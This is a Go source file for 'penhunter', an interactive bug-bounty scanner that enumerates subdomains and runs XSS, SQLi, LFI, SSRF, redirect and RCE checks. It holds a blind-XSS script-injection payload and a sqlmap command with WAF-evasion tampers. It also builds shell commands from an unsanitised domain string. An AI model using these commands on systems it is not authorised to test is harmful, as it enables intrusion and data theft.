package main

import (
	"bufio"
	"fmt"
	"os"
	"os/exec"
	"os/signal"
	"os/user"
	"path/filepath"
	"strings"
	"syscall"
	"time"

	"penhunter/cli"
	"penhunter/core"
	"penhunter/output"
	"penhunter/scanners"
	"penhunter/utils"
)

// setupSignalHandler sets up Ctrl+C handling like penhunter.sh
func setupSignalHandler() {
	c := make(chan os.Signal, 1)
	signal.Notify(c, os.Interrupt, syscall.SIGINT)

	go func() {
		for range c {
			fmt.Printf("\n%s(q)uit or (n)ext? %s", utils.Yellow, utils.NC)
			reader := bufio.NewReader(os.Stdin)
			answer, _ := reader.ReadString('\n')
			answer = strings.TrimSpace(strings.ToLower(answer))

			if answer == "q" || answer == "quit" {
				fmt.Printf("\n%sExiting...%s\n", utils.Red, utils.NC)
				os.Exit(0)
			} else if answer == "n" || answer == "next" {
				core.SetSkip(true)
				fmt.Printf("%sSkipping to next...%s\n", utils.Yellow, utils.NC)
			}
		}
	}()
}

func main() {
	// Setup Ctrl+C handler like penhunter.sh
	setupSignalHandler()

	// Check for command line flags first
	flags := cli.ParseFlags()
	if flags.Help {
		cli.ShowHelp()
		os.Exit(0)
	}
	if flags.Version {
		cli.ShowBanner()
		fmt.Printf("%sVersion: %s%s\n", utils.Green, core.CurrentVersion, utils.NC)
		os.Exit(0)
	}
	if flags.Update {
		if err := core.InstallUpdate(); err != nil {
			fmt.Printf("%sError updating: %v%s\n", utils.Red, err, utils.NC)
			os.Exit(1)
		}
		os.Exit(0)
	}
	if flags.CheckUpdate {
		hasUpdate, version, err := core.CheckForUpdates()
		if err != nil {
			fmt.Printf("%sError checking for updates: %v%s\n", utils.Red, err, utils.NC)
			os.Exit(1)
		}
		if hasUpdate {
			fmt.Printf("%sNew version available: %s (current: %s)%s\n", utils.Green, version, core.CurrentVersion, utils.NC)
			fmt.Printf("%sRun 'penhunter --update' to update%s\n", utils.Yellow, utils.NC)
		} else {
			fmt.Printf("%sYou are running the latest version (%s)%s\n", utils.Green, core.CurrentVersion, utils.NC)
		}
		os.Exit(0)
	}
	if flags.CheckTools {
		cli.ShowBanner()
		core.PrintToolStatus()
		fmt.Println()
		core.PrintInstallationInstructions()
		os.Exit(0)
	}

	// Interactive mode (like penhunter.sh)
	clearScreen()
	cli.ShowBanner()
	
	// Main menu: domain or subdomain
	fmt.Printf("%sWhat do you want: \n 1-D for one domain  \n 2-S for subdomain%s\n 9-exit(x) to exit\n", utils.Blue, utils.NC)
	
	reader := bufio.NewReader(os.Stdin)
	fmt.Printf("%sDo you want to test one domain or subdomain: %s", utils.Red, utils.NC)
	choice, _ := reader.ReadString('\n')
	choice = strings.TrimSpace(strings.ToLower(choice))

	if choice == "exit" || choice == "x" || choice == "9" {
		os.Exit(0)
	}

	if choice == "one" || choice == "d" || choice == "1" {
		handleOneDomain(reader)
	} else if choice == "sub" || choice == "s" || choice == "2" {
		handleSubdomain(reader)
	} else {
		fmt.Printf("%sInvalid choice. Exiting.%s\n", utils.Red, utils.NC)
		os.Exit(1)
	}
}

func handleOneDomain(reader *bufio.Reader) {
	clearScreen()
	cli.ShowBannerColored(utils.DarkGreen)
	
	fmt.Printf("%sEnter the domain:%s\n", utils.DarkGreen, utils.NC)
	domain, _ := reader.ReadString('\n')
	domain = strings.TrimSpace(domain)

	if domain == "" {
		fmt.Printf("%sNo domain provided. Exiting.%s\n", utils.Red, utils.NC)
		os.Exit(1)
	}

	// Get user home directory
	usr, err := user.Current()
	if err != nil {
		fmt.Printf("%sError getting user: %v%s\n", utils.Red, err, utils.NC)
		os.Exit(1)
	}
	homeDir := usr.HomeDir
	penhunterBase := filepath.Join(homeDir, "penhunter")

	// Check if domain already exists - search through ALL month directories
	baseDirs := []string{filepath.Join(penhunterBase, "one"), filepath.Join(penhunterBase, "subdomains")}
	found := false
	var existingPath string
	
	for _, base := range baseDirs {
		// Search through all month directories
		monthDirs, err := filepath.Glob(filepath.Join(base, "*"))
		if err != nil {
			continue
		}
		for _, monthDir := range monthDirs {
			domainPath := filepath.Join(monthDir, domain)
			if _, err := os.Stat(domainPath); err == nil {
				fmt.Printf("%sDomain found at: %s%s\n", utils.Green, domainPath, utils.NC)
				existingPath = domainPath
				found = true
				break
			}
		}
		if found {
			break
		}
	}

	var fullPathTarget string
	var fullPath string
	
	if found {
		// Use existing domain directory
		fullPath = existingPath
		targetFile := fmt.Sprintf("%s_urls_targets.txt", domain)
		fullPathTarget = filepath.Join(fullPath, targetFile)
		fmt.Printf("%sUsing existing target file: %s%s\n", utils.Yellow, fullPathTarget, utils.NC)
	} else {
		// Create new directory structure
		now := time.Now()
		baseDir := filepath.Join(penhunterBase, "one", now.Format("2006-01"))
		targetFile := fmt.Sprintf("%s_urls_targets.txt", domain)
		fullPath = filepath.Join(baseDir, domain)
		fullPathTarget = filepath.Join(fullPath, targetFile)

		os.MkdirAll(baseDir, 0755)
		if _, err := os.Stat(fullPath); os.IsNotExist(err) {
			os.MkdirAll(fullPath, 0755)
			fmt.Printf("Directory '%s' created.\n", fullPath)
		} else {
			fmt.Printf("The directory '%s' already exists.\n", fullPath)
		}

		// Check if target file exists
		if _, err := os.Stat(fullPathTarget); os.IsNotExist(err) {
			fmt.Printf("%sStarting subdomain enumeration for %s...%s\n", utils.Yellow, domain, utils.NC)
			
			// Enumerate subdomains
			subsFile := filepath.Join(fullPath, "all_subdomains.txt")
			core.EnumerateSubdomains(domain, subsFile)
			
			// Perform URL collection task
			core.PerformTask(domain, fullPathTarget)
		}
	}

	// Show main vulnerability menu with the found/created path
	showVulnerabilityMenu(reader, domain, fullPathTarget)
}

func handleSubdomain(reader *bufio.Reader) {
	clearScreen()
	cli.ShowBannerColored(utils.DarkGreen)
	
	fmt.Printf("%sEnter the domain for subs:%s\n", utils.Gray, utils.NC)
	domain, _ := reader.ReadString('\n')
	domain = strings.TrimSpace(domain)

	if domain == "" {
		fmt.Printf("%sNo domain provided. Exiting.%s\n", utils.Red, utils.NC)
		os.Exit(1)
	}

	// Get user home directory
	usr, err := user.Current()
	if err != nil {
		fmt.Printf("%sError getting user: %v%s\n", utils.Red, err, utils.NC)
		os.Exit(1)
	}
	homeDir := usr.HomeDir
	penhunterBase := filepath.Join(homeDir, "penhunter")

	// Check if domain already exists - search through ALL month directories
	baseDirs := []string{filepath.Join(penhunterBase, "one"), filepath.Join(penhunterBase, "subdomains")}
	found := false
	var existingPath string
	
	for _, base := range baseDirs {
		// Search through all month directories
		monthDirs, err := filepath.Glob(filepath.Join(base, "*"))
		if err != nil {
			continue
		}
		for _, monthDir := range monthDirs {
			domainPath := filepath.Join(monthDir, domain)
			if _, err := os.Stat(domainPath); err == nil {
				fmt.Printf("%sDomain found at: %s%s\n", utils.Green, domainPath, utils.NC)
				existingPath = domainPath
				found = true
				break
			}
		}
		if found {
			break
		}
	}

	var fullPath string
	var fullPathTarget string

	if found {
		// Use existing domain directory
		fullPath = existingPath
		targetFile := fmt.Sprintf("%s_urls_targets.txt", domain)
		fullPathTarget = filepath.Join(fullPath, targetFile)
		fmt.Printf("%sUsing existing target file: %s%s\n", utils.Yellow, fullPathTarget, utils.NC)
	} else {
		// Create new directory structure for subdomains
		now := time.Now()
		baseDir := filepath.Join(penhunterBase, "subdomains", now.Format("2006-01"))
		targetFile := fmt.Sprintf("%s_urls_targets.txt", domain)
		fullPath = filepath.Join(baseDir, domain)
		fullPathTarget = filepath.Join(fullPath, targetFile)

		os.MkdirAll(baseDir, 0755)
		if _, err := os.Stat(fullPath); os.IsNotExist(err) {
			os.MkdirAll(fullPath, 0755)
			fmt.Printf("Directory '%s' created.\n", fullPath)
		} else {
			fmt.Printf("The directory '%s' already exists.\n", fullPath)
		}

		if _, err := os.Stat(fullPathTarget); os.IsNotExist(err) {
			// Enumerate subdomains first
			subsFile := filepath.Join(fullPath, "all_subdomains.txt")
			core.EnumerateSubdomains(domain, subsFile)
			
			// Perform URL collection with subdomain list
			subsAliveFile := filepath.Join(fullPath, "subs.txt")
			core.PerformTaskSubdomain(domain, fullPathTarget, subsAliveFile)
		}
	}

	// Show main vulnerability menu with the found/created path
	showVulnerabilityMenu(reader, domain, fullPathTarget)
}


func showVulnerabilityMenu(reader *bufio.Reader, domain string, fullPathTarget string) {
	// If fullPathTarget is empty, search for it
	if fullPathTarget == "" {
		// Get user home directory
		usr, err := user.Current()
		if err != nil {
			fmt.Printf("%sError getting user: %v%s\n", utils.Red, err, utils.NC)
			os.Exit(1)
		}
		homeDir := usr.HomeDir
		penhunterBase := filepath.Join(homeDir, "penhunter")

		// Find target file - search through ALL month directories
		baseDirs := []string{filepath.Join(penhunterBase, "one"), filepath.Join(penhunterBase, "subdomains")}
		
		for _, base := range baseDirs {
			// Search through all month directories
			monthDirs, err := filepath.Glob(filepath.Join(base, "*"))
			if err != nil {
				continue
			}
			for _, monthDir := range monthDirs {
				domainPath := filepath.Join(monthDir, domain)
				if _, err := os.Stat(domainPath); err == nil {
					targetFile := fmt.Sprintf("%s_urls_targets.txt", domain)
					candidatePath := filepath.Join(domainPath, targetFile)
					if _, err := os.Stat(candidatePath); err == nil {
						fullPathTarget = candidatePath
						break
					}
				}
			}
			if fullPathTarget != "" {
				break
			}
		}
		
		// If still not found, try current month
		if fullPathTarget == "" {
			now := time.Now()
			baseDir := filepath.Join(penhunterBase, "one", now.Format("2006-01"))
			targetFile := fmt.Sprintf("%s_urls_targets.txt", domain)
			fullPathTarget = filepath.Join(baseDir, domain, targetFile)
			
			// Check subdomains too
			if _, err := os.Stat(fullPathTarget); os.IsNotExist(err) {
				baseDir = filepath.Join(penhunterBase, "subdomains", now.Format("2006-01"))
				fullPathTarget = filepath.Join(baseDir, domain, targetFile)
			}
		}
	}

	totalURLs := 0
	if data, err := os.ReadFile(fullPathTarget); err == nil {
		lines := strings.Split(string(data), "\n")
		for _, line := range lines {
			if strings.TrimSpace(line) != "" {
				totalURLs++
			}
		}
	}

	clearScreen()
	cli.ShowBanner()
	fmt.Printf("%sUsing existing target file: %s%s\n", utils.Yellow, fullPathTarget, utils.NC)
	fmt.Printf("%sTotal URLs to process: %d%s\n", utils.Yellow, totalURLs, utils.NC)
	
	fmt.Printf("%sDo you want to use Pen hunter(Y/n): %s", utils.Red, utils.NC)
	choice, _ := reader.ReadString('\n')
	choice = strings.TrimSpace(strings.ToLower(choice))

	if choice != "y" && choice != "Y" {
		fmt.Printf("\n%sMission Complete :)%s\n", utils.Green, utils.NC)
		os.Exit(0)
	}

	// Main vulnerability menu loop
	for {
		clearScreen()
		cli.ShowBannerColored(utils.Green)
		fmt.Printf("%sUsing existing target file: %s%s\n", utils.Yellow, fullPathTarget, utils.NC)
		fmt.Printf("%sPen Hunter:%s%s\n 1-xss(xs) for XSS (Cross-Site Scripting)%s\n%s 2-sqli(sq) for SQL Injection%s\n%s 3-lfi(lf) for Local File Inclusion%s\n%s 4-redirect(rd) for Open Redirect%s\n%s 5-ssrf(sf) for Server-Side Request Forgery%s\n%s 6-csrf(cf) for Cross-Site Request Forgery%s\n%s 7-rce(rc) for Remote Code Execution%s\n 9-exit(x) to exit\n",
			utils.Red, utils.NC,
			utils.Green, utils.NC,
			utils.Yellow, utils.NC,
			utils.Blue, utils.NC,
			utils.Magenta, utils.NC,
			utils.Cyan, utils.NC,
			utils.Purple, utils.NC,
			utils.Brown, utils.NC)

		fmt.Printf("%sChoice one: %s", utils.DarkGreen, utils.NC)
		choice, _ := reader.ReadString('\n')
		choice = strings.TrimSpace(strings.ToLower(choice))

		switch choice {
		case "xss", "xs", "1":
			handleXSSMenu(reader, fullPathTarget, domain)
		case "sqli", "sq", "2":
			handleSQLiMenu(reader, fullPathTarget, domain)
		case "lfi", "lf", "3":
			handleLFIMenu(reader, fullPathTarget, domain)
		case "redirect", "rd", "4":
			handleRedirectMenu(reader, fullPathTarget, domain)
		case "ssrf", "sf", "5":
			handleSSRFMenu(reader, fullPathTarget, domain)
		case "csrf", "cf", "6":
			handleCSRFMenu(reader, fullPathTarget, domain)
		case "rce", "rc", "7":
			handleRCEMenu(reader, fullPathTarget, domain)
		case "exit", "x", "9":
			fmt.Printf("\n%sMission Complete :)%s\n", utils.Green, utils.NC)
			os.Exit(0)
		default:
			fmt.Printf("%sInvalid choice. Exiting.%s\n", utils.Red, utils.NC)
			os.Exit(1)
		}
	}
}

func handleXSSMenu(reader *bufio.Reader, targetFile, domain string) {
	for {
		clearScreen()
		cli.ShowBannerColored(utils.Green)
		fmt.Printf("%sUsing existing target file: %s%s\n", utils.Yellow, targetFile, utils.NC)
		fmt.Printf("%sXSS Pen hunter:%s %s\n 1-Penhunter xss\n 2-dalfox(d) to use dalfox\n 3-bxss(b) to use BXSS more fast\n 4-myxss(M) for advanced take time\n 5-xsstrike(s) for xsstrike with blind%s\n 9-(Type 'exit' or 'x' to exit)\n",
			utils.Red, utils.NC, utils.Green, utils.NC)

		fmt.Printf("%sChoice one: %s", utils.DarkGreen, utils.NC)
		choice, _ := reader.ReadString('\n')
		choice = strings.TrimSpace(strings.ToLower(choice))

		if choice == "penhunter" || choice == "p" || choice == "1" {
			runPenhunterScan("xss", targetFile, domain)
			fmt.Printf("%sTO Exit press on x: %s", utils.DarkGreen, utils.NC)
			reader.ReadString('\n')
			break
		} else if choice == "dalfox" || choice == "d" || choice == "2" {
			fullPath := filepath.Dir(targetFile)
			xssCallback := core.GetXSSCallback()
			redirectDomain := core.GetRedirectDomain()
			core.RunToolInTmux("xss", fmt.Sprintf("cat %s | grep -E '^http' | sed -n '/http[s]*:\\/\\/%s/p' | sed '/\\.js/d' | sed '/\\.css/d' | sed '/\\b\\(jpg\\|png\\|svg\\|css\\|gif\\|jpeg\\|woff\\|woff2\\)\\b/d' | qsreplace '' | anew | grep -Ev '\\.(txt|js|pdf|png|jpeg|jpg|json|css)$' | dalfox pipe -b %s -F http://%s --ignore-return 404,403 -o %s/%s-dalfox.txt", targetFile, domain, xssCallback, redirectDomain, fullPath, domain))
			fmt.Printf("%sDalfox started in tmux session 'xss'. Run: tmux a -t xss%s\n", utils.Green, utils.NC)
			fmt.Printf("%sTO Exit press on x: %s", utils.DarkGreen, utils.NC)
			reader.ReadString('\n')
			break
		} else if choice == "bxss" || choice == "b" || choice == "3" {
			fullPath := filepath.Dir(targetFile)
			xssCallback := core.GetXSSCallback()
			core.RunToolInTmux("xss", fmt.Sprintf("cat %s | grep '=' | sed -n '/http[s]*:\\/\\/%s/p' | bxss -appendMode -payload '><script src=%s></script>' -parameters | anew -q %s/%s.xss.txt", targetFile, domain, xssCallback, fullPath, domain))
			fmt.Printf("%sBXSS started in tmux session 'xss'. Run: tmux a -t xss%s\n", utils.Green, utils.NC)
			fmt.Printf("%sTO Exit press on x: %s", utils.DarkGreen, utils.NC)
			reader.ReadString('\n')
			break
		} else if choice == "xsstrike" || choice == "s" || choice == "5" {
			fullPath := filepath.Dir(targetFile)
			core.RunToolInTmux("xss", fmt.Sprintf("xsstrike --seeds %s -t 10 > %s/xsstrike_target.txt", targetFile, fullPath))
			fmt.Printf("%sXSStrike started in tmux session 'xss'. Run: tmux a -t xss%s\n", utils.Green, utils.NC)
			fmt.Printf("%sTO Exit press on x: %s", utils.DarkGreen, utils.NC)
			reader.ReadString('\n')
			break
		} else if choice == "exit" || choice == "x" || choice == "9" {
			break
		}
	}
}

func handleSQLiMenu(reader *bufio.Reader, targetFile, domain string) {
	for {
		clearScreen()
		cli.ShowBannerColored(utils.Yellow)
		fmt.Printf("%sUsing existing target file: %s%s\n", utils.Yellow, targetFile, utils.NC)
		fmt.Printf("%ssqli Pen hunter:%s %s\n 1-Penhunter sqli\n 2-sqlmap(S) to use sqlmap\n 3-ghauri(G) to use ghauri more deep\n 4-mysqli(M) for advanced%s\n 9-(Type 'exit' or 'x' to exit)\n",
			utils.Red, utils.NC, utils.Yellow, utils.NC)

		fmt.Printf("%sChoice one: %s", utils.DarkGreen, utils.NC)
		choice, _ := reader.ReadString('\n')
		choice = strings.TrimSpace(strings.ToLower(choice))

		if choice == "penhunter" || choice == "p" || choice == "1" {
			runPenhunterScan("sqli", targetFile, domain)
			fmt.Printf("%sTO Exit press on x: %s", utils.DarkGreen, utils.NC)
			reader.ReadString('\n')
			break
		} else if choice == "sqlmap" || choice == "s" || choice == "2" {
			fullPath := filepath.Dir(targetFile)
			core.RunToolInTmux("sqli", fmt.Sprintf("cat %s | sed -n '/http[s]*:\\/\\/%s/p' | gf sqli | sqlmap --batch --output-dir=%s/sqlmap --risk=3 --level=3 --dbs --tamper=apostrophemask,apostrophenullencode,base64encode,between,chardoubleencode,charencode,charunicodeencode,equaltolike,greatest,ifnull2ifisnull,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2plus,space2randomblank,unionalltounion,unmagicquotes --no-cast --no-escape --threads=10 --fresh-queries --random-agent", targetFile, domain, fullPath))
			fmt.Printf("%sSQLMap started in tmux session 'sqli'. Run: tmux a -t sqli%s\n", utils.Green, utils.NC)
			fmt.Printf("%sTO Exit press on x: %s", utils.DarkGreen, utils.NC)
			reader.ReadString('\n')
			break
		} else if choice == "exit" || choice == "x" || choice == "9" {
			break
		}
	}
}

func handleLFIMenu(reader *bufio.Reader, targetFile, domain string) {
	for {
		clearScreen()
		cli.ShowBannerColored(utils.Blue)
		fmt.Printf("%sUsing existing target file: %s%s\n", utils.Yellow, targetFile, utils.NC)
		fmt.Printf("%slfi Pen hunter:%s %s\n 1-Penhunter lfi\n 2-nuclei(S) to use lfi\n 3-lfibasic(L) to use ghauri more deep\n 4-mysqli(M) for advanced%s\n 9-(Type 'exit' or 'x' to exit)\n",
			utils.Red, utils.NC, utils.Blue, utils.NC)

		fmt.Printf("%sChoice one: %s", utils.DarkGreen, utils.NC)
		choice, _ := reader.ReadString('\n')
		choice = strings.TrimSpace(strings.ToLower(choice))

		if choice == "penhunter" || choice == "p" || choice == "1" {
			runPenhunterScan("lfi", targetFile, domain)
			fmt.Printf("%sTO Exit press on x: %s", utils.DarkGreen, utils.NC)
			reader.ReadString('\n')
			break
		} else if choice == "nuclei" || choice == "s" || choice == "2" {
			fullPath := filepath.Dir(targetFile)
			outputFile := filepath.Join(fullPath, fmt.Sprintf("%s-nuclei-lfi.txt", domain))
			cmd := exec.Command("sh", "-c", fmt.Sprintf("cat %s | sed -n '/http[s]*:\\/\\/%s/p' | nuclei -t ~/nuclei-templates/ -tags lfi -o %s", targetFile, domain, outputFile))
			cmd.Stdout = os.Stdout
			cmd.Stderr = os.Stderr
			fmt.Printf("%sRunning nuclei for LFI...%s\n", utils.Yellow, utils.NC)
			cmd.Run()
			fmt.Printf("%sTO Exit press on x: %s", utils.DarkGreen, utils.NC)
			reader.ReadString('\n')
			break
		} else if choice == "exit" || choice == "x" || choice == "9" {
			break
		}
	}
}

func handleRedirectMenu(reader *bufio.Reader, targetFile, domain string) {
	for {
		clearScreen()
		cli.ShowBannerColored(utils.Magenta)
		fmt.Printf("%sUsing existing target file: %s%s\n", utils.Yellow, targetFile, utils.NC)
		fmt.Printf("%sOpen Redirect Pen Hunter:%s %s\n 1-Pen Hunter redirect\n 2-redirect-checker(R) to use redirect checker\n 3-Manual redirect test(M)%s\n 9-(Type 'exit' or 'x' to exit)\n",
			utils.Magenta, utils.NC, utils.Magenta, utils.NC)

		fmt.Printf("%sChoice one: %s", utils.DarkGreen, utils.NC)
		choice, _ := reader.ReadString('\n')
		choice = strings.TrimSpace(strings.ToLower(choice))

		if choice == "penhunter" || choice == "p" || choice == "1" {
			runPenhunterScan("redirect", targetFile, domain)
			fmt.Printf("%sTO Exit press on x: %s", utils.DarkGreen, utils.NC)
			reader.ReadString('\n')
			break
		} else if choice == "redirect-checker" || choice == "r" || choice == "2" {
			fullPath := filepath.Dir(targetFile)
			outputFile := filepath.Join(fullPath, fmt.Sprintf("%s-redirect.txt", domain))
			cmd := exec.Command("sh", "-c", fmt.Sprintf("cat %s | sed -n '/http[s]*:\\/\\/%s/p' | redirect-checker -o %s", targetFile, domain, outputFile))
			cmd.Stdout = os.Stdout
			cmd.Stderr = os.Stderr
			fmt.Printf("%sRunning redirect-checker...%s\n", utils.Yellow, utils.NC)
			cmd.Run()
			fmt.Printf("%sTO Exit press on x: %s", utils.DarkGreen, utils.NC)
			reader.ReadString('\n')
			break
		} else if choice == "exit" || choice == "x" || choice == "9" {
			break
		}
	}
}

func handleSSRFMenu(reader *bufio.Reader, targetFile, domain string) {
	for {
		clearScreen()
		cli.ShowBannerColored(utils.Cyan)
		fmt.Printf("%sUsing existing target file: %s%s\n", utils.Yellow, targetFile, utils.NC)
		fmt.Printf("%sSSRF Pen Hunter:%s %s\n 1-Pen Hunter SSRF\n 2-SSRF-checker(S) to use ssrf checker\n 3-Manual SSRF test(M)%s\n 9-(Type 'exit' or 'x' to exit)\n",
			utils.Cyan, utils.NC, utils.Cyan, utils.NC)

		fmt.Printf("%sChoice one: %s", utils.DarkGreen, utils.NC)
		choice, _ := reader.ReadString('\n')
		choice = strings.TrimSpace(strings.ToLower(choice))

		if choice == "penhunter" || choice == "p" || choice == "1" {
			runPenhunterScan("ssrf", targetFile, domain)
			fmt.Printf("%sTO Exit press on x: %s", utils.DarkGreen, utils.NC)
			reader.ReadString('\n')
			break
		} else if choice == "ssrf-checker" || choice == "s" || choice == "2" {
			fullPath := filepath.Dir(targetFile)
			outputFile := filepath.Join(fullPath, fmt.Sprintf("%s-ssrf.txt", domain))
			cmd := exec.Command("sh", "-c", fmt.Sprintf("cat %s | sed -n '/http[s]*:\\/\\/%s/p' | ssrf-checker -o %s", targetFile, domain, outputFile))
			cmd.Stdout = os.Stdout
			cmd.Stderr = os.Stderr
			fmt.Printf("%sRunning ssrf-checker...%s\n", utils.Yellow, utils.NC)
			cmd.Run()
			fmt.Printf("%sTO Exit press on x: %s", utils.DarkGreen, utils.NC)
			reader.ReadString('\n')
			break
		} else if choice == "exit" || choice == "x" || choice == "9" {
			break
		}
	}
}

func handleCSRFMenu(reader *bufio.Reader, targetFile, domain string) {
	for {
		clearScreen()
		cli.ShowBannerColored(utils.Purple)
		fmt.Printf("%sUsing existing target file: %s%s\n", utils.Yellow, targetFile, utils.NC)
		fmt.Printf("%sCSRF Pen Hunter:%s %s\n 1-Pen Hunter CSRF\n 2-CSRF-Tester(T) to use a CSRF testing tool\n 3-Manual CSRF test(M)%s\n 9-(Type 'exit' or 'x' to exit)\n",
			utils.Purple, utils.NC, utils.Purple, utils.NC)

		fmt.Printf("%sChoice one: %s", utils.DarkGreen, utils.NC)
		choice, _ := reader.ReadString('\n')
		choice = strings.TrimSpace(strings.ToLower(choice))

		if choice == "penhunter" || choice == "p" || choice == "1" {
			runPenhunterScan("csrf", targetFile, domain)
			fmt.Printf("%sTO Exit press on x: %s", utils.DarkGreen, utils.NC)
			reader.ReadString('\n')
			break
		} else if choice == "exit" || choice == "x" || choice == "9" {
			break
		}
	}
}

func handleRCEMenu(reader *bufio.Reader, targetFile, domain string) {
	for {
		clearScreen()
		cli.ShowBannerColored(utils.Brown)
		fmt.Printf("%sUsing existing target file: %s%s\n", utils.Yellow, targetFile, utils.NC)
		fmt.Printf("%sRCE Pen Hunter:%s %s\n 1-Pen Hunter RCE\n 2-RCE-Tool(T) to use a dedicated RCE tool\n 3-Manual RCE test(M)%s\n 9-(Type 'exit' or 'x' to exit)\n",
			utils.Brown, utils.NC, utils.Brown, utils.NC)

		fmt.Printf("%sChoice one: %s", utils.DarkGreen, utils.NC)
		choice, _ := reader.ReadString('\n')
		choice = strings.TrimSpace(strings.ToLower(choice))

		if choice == "penhunter" || choice == "p" || choice == "1" {
			runPenhunterScan("rce", targetFile, domain)
			fmt.Printf("%sTO Exit press on x: %s", utils.DarkGreen, utils.NC)
			reader.ReadString('\n')
			break
		} else if choice == "exit" || choice == "x" || choice == "9" {
			break
		}
	}
}

func runPenhunterScan(vulnType, targetFile, domain string) {
	// Load URLs from file
	urls, err := loadURLsFromFile(targetFile)
	if err != nil {
		fmt.Printf("%sError loading URLs: %v%s\n", utils.Red, err, utils.NC)
		return
	}

	if len(urls) == 0 {
		fmt.Printf("%sNo URLs provided to test.%s\n", utils.Red, utils.NC)
		return
	}

	fmt.Printf("%sScanning for %s vulnerabilities...%s\n", utils.Green, vulnType, utils.NC)
	fmt.Printf("%sTarget: %s%s\n", utils.Cyan, targetFile, utils.NC)
	fmt.Printf("%sURLs: %d%s\n", utils.Cyan, len(urls), utils.NC)

	// Initialize logger
	logger := core.NewLogger(false)

	// Initialize engine
	engine := core.NewEngine(25, logger)

	// Register appropriate scanner
	switch vulnType {
	case "xss":
		engine.RegisterScanner(scanners.NewXSSScanner([]string{}))
	case "sqli":
		engine.RegisterScanner(scanners.NewSQLiScanner([]string{}))
	case "lfi":
		engine.RegisterScanner(scanners.NewLFIScanner([]string{}))
	case "ssrf":
		engine.RegisterScanner(scanners.NewSSRFScanner([]string{}))
	case "rce":
		engine.RegisterScanner(scanners.NewRCEScanner([]string{}))
	case "redirect":
		engine.RegisterScanner(scanners.NewRedirectScanner([]string{}))
	case "csrf":
		engine.RegisterScanner(scanners.NewCSRFScanner([]string{}))
	}

	// Run scan
	results := engine.Scan(urls)

	// Save results
	fullPath := filepath.Dir(targetFile)
	outputFile := filepath.Join(fullPath, fmt.Sprintf("%s-%s-results.txt", domain, vulnType))
	jsonFile := filepath.Join(fullPath, fmt.Sprintf("%s-%s-results.json", domain, vulnType))

	// Output results
	if len(results) > 0 {
		fmt.Printf("\n%sFound %d vulnerabilities!%s\n", utils.Green, len(results), utils.NC)

		// Save to TXT
		txtHandler := output.NewTXTHandler(outputFile)
		if err := txtHandler.WriteResults(results); err != nil {
			fmt.Printf("%sError saving results: %v%s\n", utils.Red, err, utils.NC)
		} else {
			fmt.Printf("%sSaved: %s%s\n", utils.Green, outputFile, utils.NC)
		}

		// Save to JSON
		jsonHandler := output.NewJSONHandler(jsonFile)
		if err := jsonHandler.WriteResults(results); err != nil {
			fmt.Printf("%sError saving JSON: %v%s\n", utils.Red, err, utils.NC)
		} else {
			fmt.Printf("%sSaved: %s%s\n", utils.Green, jsonFile, utils.NC)
		}

		// Display findings
		fmt.Printf("\n%s============ Vulnerability Summary ============%s\n", utils.Cyan, utils.NC)
		for i, finding := range results {
			fmt.Printf("%s[%d] %s - %s%s\n", utils.Yellow, i+1, finding.Scanner, finding.URL, utils.NC)
			fmt.Printf("    Param: %s | Conf: %.0f%% | Sev: %s\n", finding.Parameter, finding.Confidence*100, finding.Severity)
		}
		fmt.Printf("%s===============================================%s\n", utils.Cyan, utils.NC)
	} else {
		fmt.Printf("\n%sNo vulnerabilities found.%s\n", utils.Yellow, utils.NC)
	}
}

func loadURLsFromFile(path string) ([]string, error) {
	data, err := os.ReadFile(path)
	if err != nil {
		return nil, err
	}

	lines := strings.Split(string(data), "\n")
	seen := make(map[string]bool)
	var urls []string

	for _, line := range lines {
		line = strings.TrimSpace(line)
		if line == "" || strings.HasPrefix(line, "#") {
			continue
		}
		if !strings.HasPrefix(line, "http://") && !strings.HasPrefix(line, "https://") {
			continue
		}

		// Normalize URL for deduplication
		normalized := core.NormalizeURL(line)
		if !seen[normalized] {
			seen[normalized] = true
			urls = append(urls, line)
		}
	}

	return urls, nil
}

func clearScreen() {
	cmd := exec.Command("clear")
	cmd.Stdout = os.Stdout
	cmd.Run()
}
